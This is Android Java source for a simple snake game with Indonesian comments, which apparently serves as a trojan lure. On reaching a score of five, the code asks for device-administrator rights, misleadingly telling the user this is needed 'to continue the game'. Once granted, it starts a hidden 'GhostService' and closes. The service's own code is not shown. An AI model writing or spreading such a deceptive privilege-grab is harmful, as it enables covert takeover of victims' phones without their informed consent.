package com.snakegame.helper;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Point;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.widget.*;

public class MainActivity extends Activity {
    private static final int GOAL_SCORE = 5; // skor minimal untuk menang
    private SnakeView snakeView;
    private TextView scoreText;
    private Handler handler = new Handler();
    private int score = 0;
    private boolean gameOver = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Tata letak game
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.BLACK);
        root.setGravity(Gravity.CENTER);

        // Skor
        scoreText = new TextView(this);
        scoreText.setText("Skor: 0");
        scoreText.setTextColor(Color.WHITE);
        scoreText.setTextSize(24);
        scoreText.setPadding(16, 16, 16, 16);
        root.addView(scoreText);

        // Area game (Custom View)
        snakeView = new SnakeView(this);
        LinearLayout.LayoutParams gameParams = new LinearLayout.LayoutParams(800, 800);
        snakeView.setLayoutParams(gameParams);
        root.addView(snakeView);

        // Kontrol arah (tombol)
        LinearLayout controls = new LinearLayout(this);
        controls.setOrientation(LinearLayout.HORIZONTAL);
        controls.setGravity(Gravity.CENTER);

        Button upBtn = new Button(this);
        upBtn.setText("▲");
        upBtn.setOnClickListener(v -> snakeView.setDirection(0, -1));
        controls.addView(upBtn);

        Button leftBtn = new Button(this);
        leftBtn.setText("◄");
        leftBtn.setOnClickListener(v -> snakeView.setDirection(-1, 0));
        controls.addView(leftBtn);

        Button rightBtn = new Button(this);
        rightBtn.setText("►");
        rightBtn.setOnClickListener(v -> snakeView.setDirection(1, 0));
        controls.addView(rightBtn);

        Button downBtn = new Button(this);
        downBtn.setText("▼");
        downBtn.setOnClickListener(v -> snakeView.setDirection(0, 1));
        controls.addView(downBtn);

        root.addView(controls);
        setContentView(root);

        // Mulai game loop
        snakeView.startGame();
        updateScore();
    }

    private void updateScore() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!gameOver) {
                    score = snakeView.getScore();
                    scoreText.setText("Skor: " + score);
                    if (score >= GOAL_SCORE) {
                        // Menang! Minta device admin
                        gameOver = true;
                        activateAdmin();
                    } else {
                        handler.postDelayed(this, 300);
                    }
                }
            }
        }, 300);
    }

    private void activateAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (!dpm.isAdminActive(comp)) {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan untuk melanjutkan game!");
            startActivity(intent);
        } else {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Setelah user merespon dialog device admin, cek lagi
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        ComponentName comp = new ComponentName(this, DeviceAdminReceiver.class);
        if (dpm.isAdminActive(comp)) {
            startService(new Intent(this, GhostService.class));
            finish();
        }
    }

    // Custom View ular (sederhana)
    public static class SnakeView extends View {
        private Point snakeHead;
        private Point food;
        private int dirX = 1, dirY = 0;
        private int gridSize = 40;
        private int score = 0;
        private Handler handler = new Handler();
        private boolean running = true;

        public SnakeView(MainActivity ctx) {
            super(ctx);
            snakeHead = new Point(5, 5);
            spawnFood();
        }

        public void startGame() {
            running = true;
            handler.postDelayed(gameRunnable, 200);
        }

        public void setDirection(int x, int y) {
            dirX = x; dirY = y;
        }

        public int getScore() { return score; }

        private void spawnFood() {
            food = new Point((int)(Math.random()*(800/gridSize)), (int)(Math.random()*(800/gridSize)));
        }

        private Runnable gameRunnable = new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                // Gerak ular
                snakeHead.x += dirX;
                snakeHead.y += dirY;
                // Deteksi makanan
                if (snakeHead.equals(food)) {
                    score++;
                    spawnFood();
                }
                invalidate();
                handler.postDelayed(this, 200);
            }
        };

        @Override
        protected void onDraw(android.graphics.Canvas canvas) {
            super.onDraw(canvas);
            android.graphics.Paint paint = new android.graphics.Paint();
            // Gambar makanan
            paint.setColor(Color.RED);
            canvas.drawRect(food.x * gridSize, food.y * gridSize,
                    (food.x + 1) * gridSize, (food.y + 1) * gridSize, paint);
            // Gambar ular
            paint.setColor(Color.GREEN);
            canvas.drawRect(snakeHead.x * gridSize, snakeHead.y * gridSize,
                    (snakeHead.x + 1) * gridSize, (snakeHead.y + 1) * gridSize, paint);
        }

        @Override
        public boolean onTouchEvent(MotionEvent event) {
            // Swipe sederhana? Biarkan tombol saja.
            return super.onTouchEvent(event);
        }
    }
}
